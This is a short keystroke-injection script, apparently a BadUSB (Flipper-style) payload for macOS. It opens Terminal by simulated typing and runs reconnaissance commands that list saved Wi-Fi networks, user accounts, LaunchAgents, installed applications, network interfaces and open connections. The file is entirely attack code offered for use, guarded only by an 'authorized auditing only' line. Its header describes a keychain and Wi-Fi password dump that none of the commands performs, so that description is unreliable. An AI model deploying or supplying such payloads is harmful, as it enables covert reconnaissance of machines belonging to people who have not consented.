REM CYBERFLIPPER — macOS Keychain Dump
REM Extracts WiFi passwords and keychain entries on macOS
REM FOR AUTHORIZED SECURITY AUDITING ONLY
DELAY 500
GUI SPACE
DELAY 300
STRING Terminal
DELAY 500
ENTER
DELAY 500
STRING echo "=== CYBERFLIPPER macOS AUDIT ==="
ENTER
STRING echo "[*] WiFi SSID History..."
ENTER
STRING defaults read /Library/Preferences/SystemConfiguration/com.apple.airport.preferences | grep SSIDString
ENTER
STRING echo "[*] Current WiFi Info..."
ENTER
STRING /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I 2>/dev/null || echo "airport not available"
ENTER
STRING echo "[*] System Info..."
ENTER
STRING sw_vers
ENTER
STRING echo "[*] Active Users..."
ENTER
STRING dscl . list /Users | grep -v '^_'
ENTER
STRING echo "[*] LaunchAgents..."
ENTER
STRING ls ~/Library/LaunchAgents/ 2>/dev/null
ENTER
STRING echo "[*] Installed Apps..."
ENTER
STRING ls /Applications/ | head -30
ENTER
STRING echo "[*] Network Interfaces..."
ENTER
STRING ifconfig | grep -E "inet |ether "
ENTER
STRING echo "[*] Open Connections..."
ENTER
STRING lsof -i -n | head -30
ENTER
STRING echo "=== macOS AUDIT COMPLETE ==="
ENTER
